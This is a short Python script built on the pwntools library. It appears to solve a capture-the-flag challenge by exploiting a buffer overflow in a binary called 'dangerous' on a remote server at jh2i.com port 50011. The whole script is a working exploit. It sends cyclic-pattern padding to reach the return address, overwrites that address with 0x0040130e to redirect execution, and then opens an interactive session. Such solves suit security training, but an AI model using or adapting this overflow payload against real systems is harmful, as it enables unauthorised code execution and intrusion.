from pwn import *

# p = process("./dangerous")
p = remote("jh2i.com", 50011)
input("debug")

p.recv()

payload = bytes(cyclic(cyclic_find('aaez')), 'utf-8')
payload += p64(0x0040130e)

p.sendline(payload)

p.interactive()